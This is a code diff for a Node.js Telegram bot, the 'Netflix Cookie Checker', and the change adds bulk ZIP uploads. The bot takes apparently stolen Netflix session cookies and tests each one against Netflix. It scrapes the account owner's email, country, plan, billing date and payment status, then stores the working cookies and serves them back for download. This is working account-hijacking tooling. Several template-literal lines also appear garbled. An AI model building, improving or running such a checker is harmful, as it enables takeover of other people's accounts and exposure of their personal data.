@@ -2,6 +2,7 @@ const TelegramBot = require('node-telegram-bot-api');
 const fs = require('fs');
 const path = require('path');
 const https = require('https');
+const AdmZip = require('adm-zip');
 require('dotenv').config();
 
 const token = process.env.BOT_TOKEN;
@@ -45,7 +46,6 @@ function parseCookies(filePath) {
     for (const line of lines) {
       const trimmed = line.trim();
       if (!trimmed || trimmed.startsWith('#')) continue;
-      
       const parts = trimmed.split(/\s+/);
       if (parts.length >= 7) {
         const name = parts[5];
@@ -92,43 +92,27 @@ function checkNetflix(cookieString, fileName) {
       let html = '';
       res.on('data', (chunk) => html += chunk);
       res.on('end', () => {
-        const emailMatch = html.match(/"emailAddress":"([^"]+)"/) || 
-                          html.match(/"email":\s*"([^"]+)"/) || 
-                          html.match(/"userEmail":\s*"([^"]+)"/) || 
-                          html.match(/data-uia="account-email">([^<]+)</);
+        const emailMatch = html.match(/"emailAddress":"([^"]+)"/) || html.match(/"email":\s*"([^"]+)"/) || html.match(/"userEmail":\s*"([^"]+)"/) || html.match(/data-uia="account-email">([^<]+)</);
         const email = emailMatch ? emailMatch[1].replace(/\\x40/g, '@') : '';
 
-        const emailVerified = html.includes('"isEmailVerified":true') || 
-                             html.includes('"emailVerified":true') || 
-                             html.includes('Đã xác minh') ? 'true' : 'false';
+        const emailVerified = html.includes('"isEmailVerified":true') || html.includes('"emailVerified":true') || html.includes('Đã xác minh') ? 'true' : 'false';
 
-        const countryMatch = html.match(/"currentCountry":"([^"]+)"/) || 
-                            html.match(/"countryOfSignup":"([^"]+)"/) || 
-                            html.match(/"country":\s*"([^"]+)"/) || 
-                            html.match(/"countryOfOrigin":\s*"([^"]+)"/);
+        const countryMatch = html.match(/"currentCountry":"([^"]+)"/) || html.match(/"countryOfSignup":"([^"]+)"/) || html.match(/"country":\s*"([^"]+)"/) || html.match(/"countryOfOrigin":\s*"([^"]+)"/);
         const country = countryMatch ? countryMatch[1] : '';
 
-        const billingMatch = html.match(/"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}/) || 
-                            html.match(/Next billing date:\s*([^<]+)<\/p>/i) || 
-                            html.match(/data-uia="next-billing-date"[^>]*>([^<]+)<\/p>/i) || 
-                            html.match(/"nextBillingDate":\s*"([^"]+)"/);
+        const billingMatch = html.match(/"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}/) || html.match(/Next billing date:\s*([^<]+)<\/p>/i) || html.match(/data-uia="next-billing-date"[^>]*>([^<]+)<\/p>/i) || html.match(/"nextBillingDate":\s*"([^"]+)"/);
         const nextBilling = billingMatch ? billingMatch[1].replace(/\\x20/g, ' ').trim() : '';
 
         if (!email || !country || !nextBilling) {
           return resolve({ status: 'BAD', file: fileName });
         }
 
-        const planMatch = html.match(/data-uia="plan-name"[^>]*>([^<]+)<\/h3>/i) || 
-                         html.match(/data-uia="plan-label"[^>]*>([^<]+)<\/h3>/i) || 
-                         html.match(/"localizedPlanName":\s*"([^"]+)"/) || 
-                         html.match(/"planName":\s*"([^"]+)"/);
+        const planMatch = html.match(/data-uia="plan-name"[^>]*>([^<]+)<\/h3>/i) || html.match(/data-uia="plan-label"[^>]*>([^<]+)<\/h3>/i) || html.match(/"localizedPlanName":\s*"([^"]+)"/) || html.match(/"planName":\s*"([^"]+)"/);
         let plan = planMatch ? planMatch[1].replace('Gói ', '') : 'Unknown';
         plan = capitalizePlan(plan);
 
         let payments = "0";
-        if (html.match(/"paymentMethod":\{"fieldType":"String","value":"([^"]+)"\}/) || 
-            html.includes('paymentMethod') || 
-            html.includes('data-uia="payment-method"')) {
+        if (html.match(/"paymentMethod":\{"fieldType":"String","value":"([^"]+)"\}/) || html.includes('paymentMethod') || html.includes('data-uia="payment-method"')) {
           payments = '1';
         }
 
@@ -161,39 +145,25 @@ function checkNetflix(cookieString, fileName) {
   });
 }
 
-async function processFile(chatId, fileId, fileName) {
+async function handleLocalFile(chatId, localPath, displayName) {
   if (activeChecks >= MAX_CONCURRENT) {
     await new Promise(r => setTimeout(r, 500));
-    return processFile(chatId, fileId, fileName);
+    return handleLocalFile(chatId, localPath, displayName);
   }
 
   activeChecks++;
-  const tempDir = path.join(process.cwd(), 'temp');
-  if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
-  const tempPath = path.join(tempDir, `\( {Date.now()}- \){fileName}`);
 
   try {
-    const file = await bot.getFile(fileId);
-    const fileLink = `https://api.telegram.org/file/bot\( {token}/ \){file.file_path}`;
-
-    await new Promise((resolve, reject) => {
-      const fileStream = fs.createWriteStream(tempPath);
-      https.get(fileLink, (res) => {
-        res.pipe(fileStream);
-        fileStream.on('finish', resolve);
-      }).on('error', reject);
-    });
-
-    const cookieString = parseCookies(tempPath);
+    const cookieString = parseCookies(localPath);
     if (!cookieString) {
-      bot.sendMessage(chatId, `❌ BAD | ${fileName} (no valid cookies)`);
+      bot.sendMessage(chatId, `❌ BAD | ${displayName} (no valid cookies)`);
       stats.bad++;
       return;
     }
 
-    bot.sendMessage(chatId, `🔍 Checking <b>${fileName}</b>...`, { parse_mode: 'HTML' });
+    bot.sendMessage(chatId, `🔍 Checking <b>${displayName}</b>...`, { parse_mode: 'HTML' });
 
-    const result = await checkNetflix(cookieString, fileName);
+    const result = await checkNetflix(cookieString, displayName);
 
     stats.total++;
 
@@ -216,79 +186,106 @@ async function processFile(chatId, fileId, fileName) {
       const cleanEmail = result.email.replace(/[/\\?%*:|"<>]/g, '-');
       const savePath = path.join(fullDir, `[${cleanEmail}] ${result.plan}.txt`);
       const fullContent = `Cookie: ${result.cookieString}\n\n======================================\nEmail: ${result.email}\nCountry: ${result.country.toUpperCase()}\nPlan: ${result.plan}\nNext Billing: ${result.nextBilling}\nPayments: ${result.payments}\nProfiles: ${result.extraMembers}\nEmail Verified: ${result.emailVerified}\n======================================\n`;
-      
       fs.writeFileSync(savePath, fullContent, 'utf-8');
       fs.appendFileSync(path.join(cookiesDir, 'cookies.txt'), `Cookie: ${result.cookieString}\n`, 'utf-8');
 
     } else if (result.status === 'DEAD') {
       stats.dead++;
-      bot.sendMessage(chatId, `❌ DEAD | ${fileName}`);
+      bot.sendMessage(chatId, `❌ DEAD | ${displayName}`);
     } else if (result.status === 'BAD') {
       stats.bad++;
-      bot.sendMessage(chatId, `❌ BAD | ${fileName}`);
+      bot.sendMessage(chatId, `❌ BAD | ${displayName}`);
     } else {
       stats.unknown++;
-      bot.sendMessage(chatId, `⚠️ UNKNOWN | ${fileName}`);
+      bot.sendMessage(chatId, `⚠️ UNKNOWN | ${displayName}`);
+    }
+  } catch (err) {
+    console.error(err);
+    bot.sendMessage(chatId, `❌ Error processing ${displayName}`);
+  } finally {
+    activeChecks--;
+  }
+}
+
+async function processTelegramFile(chatId, fileId, fileName) {
+  const tempDir = path.join(process.cwd(), 'temp');
+  if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
+  const tempPath = path.join(tempDir, `\( {Date.now()}- \){fileName}`);
+
+  try {
+    const file = await bot.getFile(fileId);
+    const fileLink = `https://api.telegram.org/file/bot\( {token}/ \){file.file_path}`;
+
+    await new Promise((resolve, reject) => {
+      const fileStream = fs.createWriteStream(tempPath);
+      https.get(fileLink, (res) => res.pipe(fileStream).on('finish', resolve)).on('error', reject);
+    });
+
+    const lowerName = fileName.toLowerCase();
+
+    if (lowerName.endsWith('.txt')) {
+      await handleLocalFile(chatId, tempPath, fileName);
+    } else if (lowerName.endsWith('.zip')) {
+      bot.sendMessage(chatId, `📦 Extracting ZIP: <b>${fileName}</b>...`, { parse_mode: 'HTML' });
+      const zip = new AdmZip(tempPath);
+      const entries = zip.getEntries();
+      const txtEntries = entries.filter(entry => !entry.isDirectory && entry.entryName.toLowerCase().endsWith('.txt'));
+
+      bot.sendMessage(chatId, `🔍 Found <b>${txtEntries.length}</b> .txt files. Starting...`, { parse_mode: 'HTML' });
+
+      for (const entry of txtEntries) {
+        const txtName = path.basename(entry.entryName);
+        const tempTxtPath = path.join(tempDir, `\( {Date.now()}- \){txtName}`);
+        fs.writeFileSync(tempTxtPath, zip.readFile(entry));
+        await handleLocalFile(chatId, tempTxtPath, txtName);
+        if (fs.existsSync(tempTxtPath)) fs.unlinkSync(tempTxtPath);
+      }
     }
   } catch (err) {
     console.error(err);
     bot.sendMessage(chatId, `❌ Error processing ${fileName}`);
   } finally {
     if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath);
-    activeChecks--;
   }
 }
 
 // Commands
 bot.onText(/\/start/, (msg) => {
-  bot.sendMessage(msg.chat.id, 
+  bot.sendMessage(msg.chat.id,
     `🎬 <b>Netflix Cookie Checker Bot</b>\n\n` +
-    `Send me any <b>.txt</b> files containing Netflix cookies.\n\n` +
-    `Commands:\n/stats - Show statistics\n/download - Get all live cookies\n/clear - Reset stats`, 
-    { parse_mode: 'HTML' });
+    `Send <b>.txt</b> (single) or <b>.zip</b> (multiple files) containing Netflix cookies.\n\n` +
+    `Commands: /stats /download /clear`, { parse_mode: 'HTML' });
 });
 
 bot.onText(/\/stats/, (msg) => {
-  let text = `📊 <b>Netflix Checker Stats</b>\n\n` +
-    `Total: <b>${stats.total}</b>\n` +
-    `✅ Live: <b>${stats.live}</b>\n` +
-    `❌ Dead/Bad: <b>${stats.dead + stats.bad}</b>\n` +
-    `⚠️ Unknown: <b>${stats.unknown}</b>\n\n`;
-
-  if (Object.keys(stats.plans).length > 0) {
-    text += `📦 <b>Plans:</b>\n`;
-    for (const [plan, count] of Object.entries(stats.plans)) {
-      text += `• ${plan}: ${count}\n`;
-    }
+  let text = `📊 <b>Stats</b>\nTotal: <b>\( {stats.total}</b>\n✅ Live: <b> \){stats.live}</b>\n❌ Bad: <b>\( {stats.dead + stats.bad}</b>\n⚠️ Unknown: <b> \){stats.unknown}</b>`;
+  if (Object.keys(stats.plans).length) {
+    text += `\n\n📦 Plans:\n`;
+    for (const [p, c] of Object.entries(stats.plans)) text += `• ${p}: ${c}\n`;
   }
   bot.sendMessage(msg.chat.id, text, { parse_mode: 'HTML' });
 });
 
 bot.onText(/\/download/, async (msg) => {
-  const cookiesFile = path.join(cookiesDir, 'cookies.txt');
-  if (fs.existsSync(cookiesFile) && fs.statSync(cookiesFile).size > 0) {
-    await bot.sendDocument(msg.chat.id, cookiesFile, {
-      caption: `✅ Live cookies (${new Date().toLocaleString()})`
-    });
-  } else {
-    bot.sendMessage(msg.chat.id, 'No live cookies yet.');
-  }
+  const f = path.join(cookiesDir, 'cookies.txt');
+  if (fs.existsSync(f) && fs.statSync(f).size > 0) {
+    await bot.sendDocument(msg.chat.id, f, { caption: `Live cookies - ${new Date().toLocaleString()}` });
+  } else bot.sendMessage(msg.chat.id, 'No live cookies yet.');
 });
 
 bot.onText(/\/clear/, (msg) => {
   stats = { total: 0, live: 0, dead: 0, bad: 0, unknown: 0, plans: {} };
-  bot.sendMessage(msg.chat.id, '✅ Statistics reset.');
+  bot.sendMessage(msg.chat.id, '✅ Stats reset.');
 });
 
-// File handler
 bot.on('message', async (msg) => {
   if (!msg.document) return;
   const doc = msg.document;
-  if (!doc.file_name.toLowerCase().endsWith('.txt')) {
-    return bot.sendMessage(msg.chat.id, '❌ Only .txt files are supported.');
+  const n = doc.file_name.toLowerCase();
+  if (!n.endsWith('.txt') && !n.endsWith('.zip')) {
+    return bot.sendMessage(msg.chat.id, '❌ Only .txt or .zip allowed.');
   }
-  await processFile(msg.chat.id, doc.file_id, doc.file_name);
+  await processTelegramFile(msg.chat.id, doc.file_id, doc.file_name);
 });
 
-console.log('✅ Netflix Cookie Checker Telegram Bot is running...');
-console.log('👉 Send .txt cookie files to start checking');
+console.log('✅ Bot is running... Send .txt or .zip files');
